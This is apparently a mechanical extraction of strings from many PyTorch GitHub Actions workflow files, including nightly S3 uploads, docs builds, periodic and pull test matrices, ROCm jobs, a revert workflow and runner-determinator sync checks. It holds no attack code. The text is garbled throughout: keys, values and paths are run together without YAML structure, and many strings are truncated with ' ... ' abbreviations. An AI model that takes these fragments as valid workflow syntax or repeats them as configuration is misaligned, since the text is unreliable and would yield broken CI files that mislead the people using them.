macos-py3-arm64-mps-testmacos-p ... ps-testmacos-py3-arm64-mps${{ needs.macos-py3-arm64-build.outputs.test-matrix }}sync-ta ... ps-testname: Mac MPS/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__nightly-s3-uploads.ymlNightly Upload to s337 7 * * *cron:  37 7 * * *- cron:  37 7 * * *tools/stats/upload_external_contrib_stats.py'tools/ ... ats.py'.github/workflows/nightly-s3-uploads.yml'.githu ... ds.yml'- 'tool ... ats.py'upload-stats-to-s3upload-statsuses: a ...  v5.6.0pip3 install requests==2.32.2 boto3==1.35.42
arn:aws:iam::308535385114:role/gha_upload_external_contrib_statsarn:aws ... b_statsrole-to ... b_statsUpload external contribution statsecho "Uploading external contribution stats for 10 days starting on" "$(date -d '10 days ago' '+%Y-%m-%d')"
python3 -m tools.stats.upload_external_contrib_stats --startDate "$(date -d '10 days ago' '+%Y-%m-%d')" --length 10
timeout_minutes: 10upload-stats-to-s3:name: N ... d to s3/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__nightly.yml${{ github.workflow }}--${{ github.event.pull_request.number || github.sha }}-${{ github.event_name == 'workflow_dispatch' }}link-checkLink checks./.github/workflows/_link_check.ymlrunner: ... type }}name: Link checksdocs-builddocs buildci-image:pytorch-linux-jammy-py3.9-gcc11ci-imag ... 9-gcc11runner: ... xlarge"name: docs builddocs-pushdocs push./.github/workflows/_docs.yml./.gith ... ocs.yml- docs-build${{ needs.docs-build.outputs.docker-image }}${{ github.event_name == 'schedule' || github.event_name == 'workflow_dispatch' || startsWith(github.event.ref, 'refs/tags/v') }}GH_PYTO ... OKEN }}name: docs pushupdate-commit-hashesupdate-commit-hashrepo-namevisionpin-folder.github/ci_commit_pins.github ... it_pinsrepo-name: visionaudiorepo-name: audioexecutorch.ci/docker/ci_commit_pins.ci/doc ... it_pinsrepo-na ... cutorchtritontriton-langrepo-name: triton- repo-name: visiongithub.repository_owner == 'pytorch' && (github.event_name == 'schedule' || github.event_name == 'workflow_dispatch')github. ... patch')${{ matrix.repo-owner }}/${{ matrix.repo-name }} update-commit-hash"${{ ma ... t-hash"pytorch/test-infra/.github/actions/update-commit-hash@main${{ matrix.repo-owner }}${{ mat ... wner }}${{ matrix.repo-name }}${{ mat ... name }}${{ matrix.branch }}${{ matrix.pin-folder}}${{ mat ... older}}updatebot-token${{ secrets.UPDATEBOT_TOKEN }}pytorchbot-tokenrepo-ow ... wner }}name: " ... t-hash"- name: ... t-hash"name: nightly/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__nitpicker.ymlNitpicker[opened, reopened]${{ github.event.pull_request.number != 26921 && github.repository_owner == 'pytorch' }}ethanis/nitpicker@v1nitpicks.github/nitpicks.yml'.githu ... ks.yml'nitpick ... ks.yml'uses: e ... cker@v1name: Nitpicker/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__operator_benchmark.ymloperator_benchmarkciflow/op-benchmark/*test_modeshort'short'tag filter for operator benchmarks, options from long, short, alltag fil ... rt, alltest_mode:linux-jammy-cpu-py3_9-gcc11-opbenchmark-buildlinux-jammy-cpu-py3.9-gcc11-opbenchmarklinux-j ... nchmark{ include: [
  { config: "cpu_operator_benchmark_short", shard: 1, num_shards: 1, runner: "linux.12xlarge" },
]}
linux-jammy-cpu-py3_9-gcc11-opbenchmark-on-demand-buildlinux-j ... d-build${{ github.event_name == 'workflow_dispatch' && github.repository_owner == 'pytorch' }}{ include: [
  { config: "cpu_operator_benchmark_${{ inputs.test_mode }}", shard: 1, num_shards: 1, runner: "linux.12xlarge" },
]}
linux-jammy-cpu-py3_9-gcc11-opbenchmark-test${{ needs.linux-jammy-cpu-py3_9-gcc11-opbenchmark-build.outputs.docker-image }}${{ needs.linux-jammy-cpu-py3_9-gcc11-opbenchmark-build.outputs.test-matrix }}name: l ... nchmarkname: o ... nchmark/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__periodic-rocm-mi300.ymlperiodic-rocm-mi30045 0,8,16 * * 1-545 4 * * 0,6cron: 45 4 * * 0,645 4,12,20 * * 1-545 12 * * 0,6cron: 45 12 * * 0,6cron: 2 ... d testsciflow/periodic-rocm-mi300/*ciflow/ ... mi300/*- ciflo ... mi300/*- release/*${{ github.workflow }}-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}-${{ github.event_name == 'schedule' }}-${{ github.event.schedule }}${{ git ... dule }}group:  ... dule }}llm-td./.github/workflows/llm_td_retrieval.yml./.gith ... val.ymlname: before-test(github.event_name != 'schedule' || github.repository == 'pytorch/pytorch') && github.repository_owner == 'pytorch'(github ... ytorch'linux-jammy-rocm-py3_10-build{ include: [
  { config: "distributed", shard: 1, num_shards: 3, runner: "linux.rocm.gpu.mi300.4", owners: ["module:rocm", "oncall:distributed"] },
  { config: "distributed", shard: 2, num_shards: 3, runner: "linux.rocm.gpu.mi300.4", owners: ["module:rocm", "oncall:distributed"] },
  { config: "distributed", shard: 3, num_shards: 3, runner: "linux.rocm.gpu.mi300.4", owners: ["module:rocm", "oncall:distributed"] },
]}
linux-jammy-rocm-py3_10-test- linux ... 0-build${{ needs.linux-jammy-rocm-py3_10-build.outputs.docker-image }}${{ needs.linux-jammy-rocm-py3_10-build.outputs.test-matrix }}llm-td:name: p ... m-mi300/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__periodic.ymlperiodicciflow/periodic/*- ciflow/periodic/*linux-focal-cuda12_6-py3_10-gcc11-buildlinux-f ... 1-buildlinux-focal-cuda12.6-py3.10-gcc11linux-f ... 0-gcc11ci-image:pytorch-linux-focal-cuda12.6-cudnn9-py3-gcc11ci-imag ... 3-gcc11{ include: [
  { config: "nogpu_AVX512", shard: 1, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "nogpu_AVX512", shard: 2, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "nogpu_AVX512", shard: 3, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "nogpu_NO_AVX2", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "nogpu_NO_AVX2", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "jit_legacy", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu" },
]}
name: l ... 0-gcc11linux-focal-cuda12_6-py3_10-gcc11-testlinux-f ... 11-test- linux ... 1-build${{ needs.linux-focal-cuda12_6-py3_10-gcc11-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc11-build.outputs.test-matrix }}build-e ... 0-gcc11linux-focal-cuda11_8-py3_9-gcc9-buildlinux-f ... 9-buildlinux-focal-cuda11.8-py3.9-gcc9linux-f ... .9-gcc9ci-image:pytorch-linux-focal-cuda11.8-cudnn9-py3-gcc9ci-imag ... y3-gcc9{ include: [
  { config: "multigpu", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.12xlarge.nvidia.gpu", owners: ["oncall:distributed"] },
  { config: "multigpu", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.12xlarge.nvidia.gpu", owners: ["oncall:distributed"] },
]}
name: l ... .9-gcc9linux-focal-cuda11_8-py3_9-gcc9-testlinux-f ... c9-test${{ needs.linux-focal-cuda11_8-py3_9-gcc9-build.outputs.docker-image }}${{ needs.linux-focal-cuda11_8-py3_9-gcc9-build.outputs.test-matrix }}build-e ... .9-gcc9linux-focal-cuda11_8-py3_10-gcc9-debug-buildlinux-f ... g-buildlinux-focal-cuda11.8-py3.10-gcc9-debuglinux-f ... 9-debug{ include: [
  { config: "default", shard: 1, num_shards: 7, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu", owners: ["oncall:debug-build"] },
  { config: "default", shard: 2, num_shards: 7, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu", owners: ["oncall:debug-build"] },
  { config: "default", shard: 3, num_shards: 7, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu", owners: ["oncall:debug-build"] },
  { config: "default", shard: 4, num_shards: 7, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu", owners: ["oncall:debug-build"] },
  { config: "default", shard: 5, num_shards: 7, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu", owners: ["oncall:debug-build"] },
  { config: "default", shard: 6, num_shards: 7, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu", owners: ["oncall:debug-build"] },
  { config: "default", shard: 7, num_shards: 7, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu", owners: ["oncall:debug-build"] },
]}
name: l ... 9-debuglinux-focal-cuda11_8-py3_10-gcc9-debug-testlinux-f ... ug-test- linux ... g-build${{ needs.linux-focal-cuda11_8-py3_10-gcc9-debug-build.outputs.docker-image }}${{ needs.linux-focal-cuda11_8-py3_10-gcc9-debug-build.outputs.test-matrix }}build-e ... 9-debug{ include: [
  { config: "distributed", shard: 1, num_shards: 3, runner: "linux.rocm.gpu.4", owners: ["module:rocm", "oncall:distributed"] },
  { config: "distributed", shard: 2, num_shards: 3, runner: "linux.rocm.gpu.4", owners: ["module:rocm", "oncall:distributed"] },
  { config: "distributed", shard: 3, num_shards: 3, runner: "linux.rocm.gpu.4", owners: ["module:rocm", "oncall:distributed"] },
]}
linux-focal-cuda12_6-py3-gcc11-slow-gradcheck-buildlinux-focal-cuda12.6-py3-gcc11-slow-gradchecklinux-f ... adcheck{ include: [
  { config: "default", shard: 1, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
  { config: "default", shard: 2, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
  { config: "default", shard: 3, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
  { config: "default", shard: 4, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
  { config: "default", shard: 5, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
  { config: "default", shard: 6, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
  { config: "default", shard: 7, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
  { config: "default", shard: 8, num_shards: 8, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu", owners: ["module:slowgradcheck"] },
]}
name: l ... adchecklinux-focal-cuda12_6-py3-gcc11-slow-gradcheck-testlinux-f ... ck-test- linux ... k-build${{ needs.linux-focal-cuda12_6-py3-gcc11-slow-gradcheck-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3-gcc11-slow-gradcheck-build.outputs.test-matrix }}build-e ... adcheckname: periodic/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__pull.ymlpullcron: 2 ... 9am PDT- cron: ... 9am PDTlinux-jammy-py3_9-gcc11-build{ include: [
  { config: "default", shard: 1, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "default", shard: 2, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "default", shard: 3, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "default", shard: 4, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "default", shard: 5, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "docs_test", shard: 1, num_shards: 1,  runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "jit_legacy", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "backwards_compat", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "distributed", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "distributed", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "numpy_2_x", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
]}
name: l ... 9-gcc11linux-jammy-py3_9-gcc11-testlinux-j ... 11-test${{ needs.linux-jammy-py3_9-gcc11-build.outputs.docker-image }}${{ needs.linux-jammy-py3_9-gcc11-build.outputs.test-matrix }}linux-docsname: linux-docslinux-jammy-py3_9-gcc11-no-opslinux-j ... -no-opslinux-jammy-py3.9-gcc11-no-ops{ include: [
  { config: "default", shard: 1, num_shards: 1 },
]}
name: l ... -no-opslinux-jammy-py3_9-gcc11-pchlinux-j ... c11-pchlinux-jammy-py3.9-gcc11-pchname: l ... c11-pchlinux-jammy-py3_10-clang15-asan-buildlinux-j ... n-buildlinux-jammy-py3.10-clang15-asanlinux-j ... 15-asanci-image:pytorch-linux-jammy-py3-clang15-asanci-imag ... 15-asan{ include: [
  { config: "default", shard: 1, num_shards: 6, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 2, num_shards: 6, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 3, num_shards: 6, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 4, num_shards: 6, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 5, num_shards: 6, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 6, num_shards: 6, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
]}
asan-buildname: l ... 15-asanlinux-jammy-py3_10-clang15-asan-testlinux-j ... an-test- linux ... n-build${{ needs.linux-jammy-py3_10-clang15-asan-build.outputs.docker-image }}${{ needs.linux-jammy-py3_10-clang15-asan-build.outputs.test-matrix }}asan-testbuild-e ... 15-asanlinux-focal-py3_9-clang10-onnx-buildlinux-f ... x-buildlinux-focal-py3.9-clang10-onnxlinux-f ... 10-onnxci-image:pytorch-linux-focal-py3-clang10-onnxci-imag ... 10-onnx{ include: [
  { config: "default", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "default", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
]}
name: l ... 10-onnxlinux-focal-py3_9-clang10-onnx-testlinux-f ... nx-test- linux ... x-build${{ needs.linux-focal-py3_9-clang10-onnx-build.outputs.docker-image }}${{ needs.linux-focal-py3_9-clang10-onnx-build.outputs.test-matrix }}build-e ... 10-onnxlinux-focal-py3_9-clang10-buildlinux-f ... 0-buildlinux-focal-py3.9-clang10linux-f ... clang10ci-image:pytorch-linux-focal-py3.9-clang10ci-imag ... clang10{ include: [
  { config: "default", shard: 1, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 2, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 3, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 4, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "default", shard: 5, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "crossref", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "crossref", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "dynamo_wrapped", shard: 1, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "dynamo_wrapped", shard: 2, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
  { config: "dynamo_wrapped", shard: 3, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
]}
name: l ... clang10linux-focal-py3_9-clang10-testlinux-f ... 10-test${{ needs.linux-focal-py3_9-clang10-build.outputs.docker-image }}${{ needs.linux-focal-py3_9-clang10-build.outputs.test-matrix }}build-e ... clang10linux-focal-py3_13-clang10-buildlinux-focal-py3.13-clang10ci-image:pytorch-linux-focal-py3.13-clang10linux-focal-py3_13-clang10-test${{ needs.linux-focal-py3_13-clang10-build.outputs.docker-image }}${{ needs.linux-focal-py3_13-clang10-build.outputs.test-matrix }}linux-focal-cuda11_8-py3_10-gcc9-buildlinux-focal-cuda11.8-py3.10-gcc9linux-f ... 10-gcc97.5'7.5'{ include: [
  { config: "distributed", shard: 1, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g4dn.12xlarge.nvidia.gpu" },
  { config: "distributed", shard: 2, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g4dn.12xlarge.nvidia.gpu" },
  { config: "distributed", shard: 3, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g4dn.12xlarge.nvidia.gpu" },
]}
name: l ... 10-gcc9linux-focal-cuda11_8-py3_10-gcc9-test- linux ... 9-build${{ needs.linux-focal-cuda11_8-py3_10-gcc9-build.outputs.docker-image }}${{ needs.linux-focal-cuda11_8-py3_10-gcc9-build.outputs.test-matrix }}timeout-minutes: 360{ include: [
  { config: "default", shard: 1, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu" },
  { config: "default", shard: 2, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu" },
  { config: "default", shard: 3, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu" },
  { config: "default", shard: 4, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu" },
  { config: "default", shard: 5, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge.nvidia.gpu" },
]}
linux-jammy-py3-clang12-mobile-buildname: l ... e-buildlinux-jammy-cuda-11_8-cudnn9-py3_9-clang12-buildlinux-j ... 2-buildlinux-jammy-cuda11.8-cudnn9-py3.9-clang12linux-j ... clang12ci-image:pytorch-linux-jammy-cuda11.8-cudnn9-py3.9-clang12ci-imag ... clang12name: l ... clang12linux-focal-py3_9-clang9-xla-buildlinux-f ... a-buildlinux-focal-py3_9-clang9-xlalinux-f ... ng9-xlalinux-focal-py3.9-clang9-xla308535385114.dkr.ecr.us-east-1.amazonaws.com/pytorch/xla_base:v1.3-lite3085353 ... .3-lite{ include: [
  { config: "xla", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.12xlarge" },
]}
name: l ... ng9-xlalinux-focal-py3_9-clang9-xla-testlinux-f ... la-test${{ needs.linux-focal-py3_9-clang9-xla-build.outputs.docker-image }}${{ needs.linux-focal-py3_9-clang9-xla-build.outputs.test-matrix }}build-e ... ng9-xlawin-vs2022-cpu-py3-buildwin-vs2 ... 3-buildwin-vs2022-cpu-py3./.github/workflows/_win-build.ymlwin-cpu-build{ include: [
  { config: "default", shard: 1, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}windows.4xlarge.nonephemeral" },
  { config: "default", shard: 2, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}windows.4xlarge.nonephemeral" },
  { config: "default", shard: 3, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}windows.4xlarge.nonephemeral" },
]}
build-e ... cpu-py3if: git ... equest'linux-focal-cpu-py3_10-gcc11-bazel-testlinux-f ... el-testlinux-focal-cpu-py3.10-gcc11-bazel-test./.github/workflows/_bazel-build-test.ymllinux-focal-cuda12.6-py3.10-gcc11-bazel-test{ include: [
  { config: "default", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
]}
runner: ... .large"name: l ... el-testlinux-jammy-py3_9-gcc11-mobile-lightweight-dispatch-buildlinux-j ... h-buildlinux-jammy-py3.9-gcc11-mobile-lightweight-dispatch-buildname: l ... h-build{ include: [
  { config: "default", shard: 1, num_shards: 3, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 2, num_shards: 3, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 3, num_shards: 3, runner: "linux.rocm.gpu.2" },
]}
linux-focal-cuda12_6-py3_10-gcc11-sm89-buildlinux-focal-cuda12.6-py3.10-gcc11-sm89linux-f ... 11-sm898.9{ include: [
  { config: "default", shard: 1, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g6.4xlarge.experimental.nvidia.gpu" },
  { config: "default", shard: 2, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g6.4xlarge.experimental.nvidia.gpu" },
  { config: "default", shard: 3, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g6.4xlarge.experimental.nvidia.gpu" },
  { config: "default", shard: 4, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g6.4xlarge.experimental.nvidia.gpu" },
  { config: "default", shard: 5, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g6.4xlarge.experimental.nvidia.gpu" },
]}
name: l ... 11-sm89unstable-linux-focal-cuda12_6-py3_10-gcc11-sm89-build-xfailunstabl ... d-xfailunstable-linux-focal-cuda12.6-py3.10-gcc11-sm89-xfailunstabl ... 9-xfail{ include: [
  { config: "default", shard: 1, num_shards: 5, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g6.4xlarge.experimental.nvidia.gpu" },
]}
name: u ... 9-xfaillinux-focal-cuda12_6-py3_10-gcc11-sm89-testlinux-f ... 89-test${{ needs.linux-focal-cuda12_6-py3_10-gcc11-sm89-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc11-sm89-build.outputs.test-matrix }}build-e ... 11-sm89linux-jammy-py3-clang12-executorch-buildlinux-jammy-py3-clang12-executorchlinux-j ... cutorchci-image:pytorch-linux-jammy-py3-clang12-executorchci-imag ... cutorch{ include: [
  { config: "executorch", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
]}
name: l ... cutorchlinux-jammy-py3-clang12-executorch-testlinux-j ... ch-test${{ needs.linux-jammy-py3-clang12-executorch-build.outputs.docker-image }}${{ needs.linux-jammy-py3-clang12-executorch-build.outputs.test-matrix }}build-e ... cutorchlinux-focal-cuda12_4-py3_10-gcc9-inductor-buildcuda12.4-py3.10-gcc9-sm75cuda12. ... c9-sm75linux-focal-cuda12.4-py3.10-gcc9-sm75linux-f ... c9-sm75ci-image:pytorch-linux-focal-cuda12.4-cudnn9-py3-gcc9-inductor-benchmarks{ include: [
  { config: "pr_time_benchmarks", shard: 1, num_shards: 1, runner: "linux.g4dn.metal.nvidia.gpu" },
]}
name: c ... c9-sm75linux-focal-cuda12_4-py3_10-gcc9-inductor-test${{ needs.linux-focal-cuda12_4-py3_10-gcc9-inductor-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_4-py3_10-gcc9-inductor-build.outputs.test-matrix }}build-e ... c9-sm75linux-jammy-xpu-2025_1-py3_9-buildlinux-j ... 9-buildlinux-jammy-xpu-2025.1-py3.9linux-j ... 1-py3.9linux-xpu-2025-1-buildlinux-x ... 1-buildci-image:pytorch-linux-jammy-xpu-2025.1-py3ci-imag ... 5.1-py3{ include: [
  { config: "default", shard: 1, num_shards: 4, runner: "linux.idc.xpu" },
  { config: "default", shard: 2, num_shards: 4, runner: "linux.idc.xpu" },
  { config: "default", shard: 3, num_shards: 4, runner: "linux.idc.xpu" },
  { config: "default", shard: 4, num_shards: 4, runner: "linux.idc.xpu" },
]}
sync-ta ... 1-buildname: l ... 1-py3.9name: pull/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__revert.ymlRevert merged PRtry-revert[try-revert]types: [try-revert]do_reverttry_revert_pr_${{ github.event.client_payload.pr_num }}try_rev ... _num }}mergebot${{ secrets.MERGEBOT_TOKEN }}git config --global user.email "pytorchmergebot@users.noreply.github.com"
git config --global user.name "PyTorch MergeBot"
Revert PRCOMMENT_ID${{ github.event.client_payload.comment_id }}${{ git ... t_id }}REASON${{ github.event.client_payload.reason }}${{ git ... ason }}set -ex
if [ -n "${COMMENT_ID}" ]; then
  if [ -n "${REASON}" ]; then
    python3 .github/scripts/trymerge.py --revert --comment-id "${COMMENT_ID}" --reason "${REASON}" "${PR_NUM}"
  else
    python3 .github/scripts/trymerge.py --revert --comment-id "${COMMENT_ID}" "${PR_NUM}"
  fi
else
  if [ -n "${REASON}" ]; then
    python3 .github/scripts/trymerge.py --revert --reason "${REASON}" "${PR_NUM}"
  else
    python3 .github/scripts/trymerge.py --revert "${PR_NUM}"
  fi
fi
name: Revert PRComment on Canceled${{ cancelled() && steps.checkout.outcome == 'success' }}${{ can ... ess' }}set -ex
python3 .github/scripts/comment_on_pr.py "${PR_NUM}" "revert"
name: C ... anceledname: t ... _num }}do_revert:name: R ... rged PR/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__rocm-mi300.ymlrocm-mi300ciflow/rocm-mi300/*{ include: [
  { config: "default", shard: 1, num_shards: 6, runner: "linux.rocm.gpu.mi300.2" },
  { config: "default", shard: 2, num_shards: 6, runner: "linux.rocm.gpu.mi300.2" },
  { config: "default", shard: 3, num_shards: 6, runner: "linux.rocm.gpu.mi300.2" },
  { config: "default", shard: 4, num_shards: 6, runner: "linux.rocm.gpu.mi300.2" },
  { config: "default", shard: 5, num_shards: 6, runner: "linux.rocm.gpu.mi300.2" },
  { config: "default", shard: 6, num_shards: 6, runner: "linux.rocm.gpu.mi300.2" },
]}
name: rocm-mi300/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__rocm.ymlciflow/rocm/*- ciflow/rocm/*{ include: [
  { config: "default", shard: 1, num_shards: 6, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 2, num_shards: 6, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 3, num_shards: 6, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 4, num_shards: 6, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 5, num_shards: 6, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 6, num_shards: 6, runner: "linux.rocm.gpu.2" },
]}
name: rocm/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__runner-determinator-validator.ymlValidate Runner Determinator Script is in SyncValidat ... in Sync.github/workflows/_runner-determinator.yml.github ... tor.yml.github/workflows/runner-determinator-validator.yml.github/scripts/runner_determinator.py.github ... ator.py- .gith ... tor.ymlcheck-runner-determinatorcheck-r ... minatorRun Hardcode runner-determinator scriptRun Har ...  script# Extract the script content from _runner-determinator.yml and skip the first 10 spaces of each line
script_content=$(awk '/cat <<EOF > runner_determinator.py/{flag=1;next}/EOF$/{flag=0}flag{print substr($0, 11)}' .github/workflows/_runner-determinator.yml)

# Write the extracted script content to runner_determinator.py
echo "$script_content" > runner_determinator_workflow.py
Compare runner-determinator script embedded in workflow with checked in scriptCompare ...  script# Compare the extracted runner_determinator script with the existing one
# If this check fails, then make sure the contents of .github/scripts/runner_determinator.py is in sync with the
# version embedded into .github/workflows/_runner-determinator.yml
diff runner_determinator_workflow.py .github/scripts/runner_determinator.py
name: C ...  scriptcheck-r ... inator:name: V ... in Sync/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__runner_determinator_script_sync.yaml.github/workflows/_runner-determinator.yaml.github ... or.yaml.github/workflows/_runner_determinator_script_sync.yaml.github ... nc.yaml.github/workflows/scripts/runner_determinator.py- .gith ... or.yamlpython-script-sync-checkpython- ... c-check.github
Extract the script from runner_determinatorExtract ... minator# Runner determinator files
RUNNER_DETERMINATOR_WORKFLOW_FILE=.github/workflows/_runner-determinator.yml
RUNNER_DETERMINATOR_PYTHON_SCRIPT_FILE=.github/scripts/runner_determinator.py

# Parse the job file, extract the script and run it, up to the final EOF,
# to generate the python file in the local folder
yq '.jobs.runner-determinator.steps[] | select(.id == "hardcode-script") | .run' \
    "${RUNNER_DETERMINATOR_WORKFLOW_FILE}" | sed '/^EOF$/q' | bash

set +e
DIFF="$(diff "$(basename ${RUNNER_DETERMINATOR_PYTHON_SCRIPT_FILE})" ${RUNNER_DETERMINATOR_PYTHON_SCRIPT_FILE})"
IS_DIFF=$?
set -e
if [ $IS_DIFF -eq 0 ]; then
    echo "Scripts are in sync! ^_^";
else
    echo -e "Scripts are *NOT* in sync:\n ${DIFF}";
    exit 1
fi
